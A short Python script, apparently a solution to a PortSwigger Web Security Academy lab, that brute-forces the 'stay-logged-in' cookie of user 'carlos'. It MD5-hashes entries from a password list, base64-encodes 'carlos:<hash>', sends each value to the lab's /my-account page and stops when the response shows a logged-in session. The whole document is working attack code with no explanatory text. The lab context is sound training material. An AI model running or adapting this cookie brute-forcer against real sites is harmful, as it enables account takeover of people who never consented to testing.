

import requests
import base64
import hashlib

url = 'https://0a6700310389e8e181a225fb00c00066.web-security-academy.net'

readfile = open('Authentication\password.txt', 'r')
content = readfile.read()
content = content.splitlines()
md5 = []
for i in range(0, 100):
    
    password = hashlib.md5(content[i].encode()).hexdigest()
    
    temp="carlos"+":"+password
    print(temp)
    base64_string = base64.b64encode((temp).encode()).decode()
    print(base64_string)
    res = requests.get(url + "/my-account",cookies={'stay-logged-in': base64_string})
    writefile = open('Authentication\log2.txt', 'a')
    writefile.write(f"{res.status_code}+\":::::\"+{base64_string} \n")
    if "Log out" in res.text:
        print("base64_string:", base64_string)
        break

